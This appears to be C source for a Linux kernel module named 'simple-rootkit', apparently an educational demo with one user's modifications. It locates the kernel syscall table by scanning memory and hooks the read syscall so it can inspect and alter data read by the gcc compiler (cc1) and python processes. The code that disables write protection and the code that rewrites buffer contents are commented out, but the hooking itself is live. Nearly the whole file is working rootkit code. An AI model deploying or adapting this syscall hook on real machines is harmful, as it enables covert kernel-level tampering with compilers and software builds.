#include <linux/module.h> // needed for writing modules
#include <linux/kernel.h> // kernel helper functions like printk
#include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> helpers
//#include <asm/paravirt.h> // read_cr0, write_cr0
#include <linux/sched.h> // current task_struct
#include <linux/slab.h> // kmalloc, kfree
#include <asm/uaccess.h> // copy_from_user, copy_to_user

#include <asm/cacheflush.h> // Monowar


// My code : Monowar
/*
static void disable_page_protection(void);
static void enable_page_protection(void);

static void disable_page_protection(void) {

    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value));
    if (value & 0x00010000) {
            value &= ~0x00010000;
            asm volatile("mov %0,%%cr0": : "r" (value));
    }
}

static void enable_page_protection(void) {

    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value));
    if (!(value & 0x00010000)) {
            value |= 0x00010000;
            asm volatile("mov %0,%%cr0": : "r" (value));
    }
}

*/


/* The sys_call_table is const but we can point our own variable at
 * its memory location to get around that.
 */
unsigned long **sys_call_table;

/* The control register's value determines whether or not memory is
 * protected. We'll need to modify it, to turn off memory protection,
 * in order to write over the read system call. Here we store the initial
 * control register value so we can set it back when we're finished
 * (memory protection is generally good)!
 */
unsigned long original_cr0;

/* The prototype for the write syscall. This is where we'll store the original
 * before we swap it out in the sys_call_table.
 */
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);

/* Our new system call function; a wrapper for the original read. */
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    /* execute the original read call, and hold on to its return value
     * now we can add whatever we want to the buffer before exiting
     * the function.
     */
    long ret;
    ret = ref_sys_read(fd, buf, count);
    if (ret >= 6 && fd > 2) {
        /* We can find the current task name from the current task struct
         * then use that to decide if we'd like to swap out data
         * in the read buffer before returning to the user.
         * note: cc1 is the name of the task that opens source files
         * during compilation via gcc.
         */
        if (strcmp(current->comm, "cc1") == 0 ||
            strcmp(current->comm, "python") == 0) {

            long i;

            /* It's not good to deal directly with userspace memory; we should
             * copy the buffer to kernel memory, write to it, then copy it
             * back to userspace
             */
            char *kernel_buf;
            if (count > PAGE_SIZE) {
                printk("simple-rootkit refused to kmalloc > %lu B (%lu)\n", PAGE_SIZE, count);
                return ret;
            }
            kernel_buf = kmalloc(count, GFP_KERNEL);
            if (!kernel_buf) {
                printk("simple-rootkit failed to allocate memory... :(\n");
                return ret; /* an error; but lets not bug the user, heh */
            }
            if(copy_from_user(kernel_buf, buf, count)) {
                printk("simple-rootkit failed to copy the read buffer... :(\n");
                kfree(kernel_buf);
                return ret;
            }

            // Do nothing, Just read the buffer : Monowar
            /*
            for (i = 0; i < (ret - 6); i++) {
                if (kernel_buf[i] == 'W' &&
                    kernel_buf[i+1] == 'o' &&
                    kernel_buf[i+2] == 'r' &&
                    kernel_buf[i+3] == 'l' &&
                    kernel_buf[i+4] == 'd' &&
                    kernel_buf[i+5] == '!') {
                    kernel_buf[i] = 'M';
                    kernel_buf[i+1] = 'r';
                    kernel_buf[i+2] = 'r';
                    kernel_buf[i+3] = 'r';
                    kernel_buf[i+4] = 'g';
                    kernel_buf[i+5] = 'n';
                }
            }
            */

            if(copy_to_user(buf, kernel_buf, count))
                printk("simple-rootkit failed to write to read buffer... :(\n");
            kfree(kernel_buf);
        }
    }
    return ret;
}

/* The whole trick here is to find the syscall table in memory
 * so we can copy it to a non-const pointer array,
 * then, turn off memory protection so that we can modify the
 * syscall table.
 */
static unsigned long **aquire_sys_call_table(void)
{
    /* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
     * this keeps us from searching for our syscall table in user space memory
     */
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;
    /* Scan memory searching for the syscall table, which is contigious */
    printk("Starting syscall table scan from: %lx\n", offset);
    while (offset < ULLONG_MAX) {
        /* cast our starting offset to match the system call table's type */
        sct = (unsigned long **)offset;

        /* We're scanning for a bit pattern that matches sct[__NR_close]
         * so we just increase 'offset' until we find it. Put another way
         * we're looking for the first location in memory which seems to hold
         * the address of the sys_close function.
         */
        if (sct[__NR_close] == (unsigned long *) sys_close) {
            printk("Syscall table found at: %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}

static int __init rootkit_start(void)
{
    // Find the syscall table in memory
    if(!(sys_call_table = aquire_sys_call_table()))
        return -1;

    // record the initial value in the cr0 register
    //original_cr0 = read_cr0();
    // set the cr0 register to turn off write protection
    //write_cr0(original_cr0 & ~0x00010000);
    // disable write protection : Monowar
    //disable_page_protection();

    // copy the old read call
    ref_sys_read = (void *)sys_call_table[__NR_read];
    // write our modified read call to the syscall table
    sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
    // turn memory protection back on
    //write_cr0(original_cr0);

    //enable write protection : Monowar
    //enable_page_protection();

    return 0;
}

static void __exit rootkit_end(void)
{
    if(!sys_call_table) {
        return;
    }

    // turn off memory protection
    //write_cr0(original_cr0 & ~0x00010000);

    // disable write protection : Monowar
    //disable_page_protection();

    // put the old system call back in place
    sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
    // memory protection back on
    //write_cr0(original_cr0);

    //enable write protection : Monowar
    //enable_page_protection();

}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
